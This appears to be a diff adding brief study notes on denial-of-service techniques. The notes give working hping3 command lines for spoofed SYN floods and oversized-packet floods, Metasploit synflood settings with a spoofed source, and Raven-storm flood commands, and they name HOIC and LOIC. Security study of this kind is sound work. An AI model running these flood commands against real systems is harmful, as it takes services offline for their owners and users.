@@ -1,0 +1,45 @@
+ Denial-of-Service-check
+• UDP flood attack
+
+	
+• ICMP flood attack
+• Ping of Death and smurf attack
+• Pulse wave and zero-day attack
+
+	1.  DoS and DDoS  Techniques
+		○ Metasploit
+			§ Payload to use "synflood"
+			§ Set the following 
+				□ RHOST
+				□ SHOST(Spoofed)
+				□ RPORT
+			§ In this case, only the IP of the source packet is spoofed, however the MAC still shows up as the attackers system within the frame.
+				
+		○  hping3
+			§ SYN ATTACK- 
+				$hping3 -S <target IP> -a <spoofed IP> -p <port> --flood
+				-S	SYN 
+				--flood	Flood
+				-a 	Spoof add
+			§ PoD Attack- attacker tries to crash syst by sending bad packets
+				$hping3 -d 65538 -S -p 21 --flood <IP>
+			§ UDP layer flood
+				□ -2
+        
+		○  Raven-storm
+			§ Layer3,4,7 attack
+			$sudo rst
+				>l4
+				>ip <ip>
+				>port <80>
+				>threads <#>
+				>run
+		○  HOIC
+			§ DOS attack with HTTP(GET and POST) protocols
+      
+		○ g LOIC
+			§ DOS attack with TCP/UDP/HTTP(GET-only Floods)
+			
+protect  DDoS with Anti DDoS Guardian
+
+	
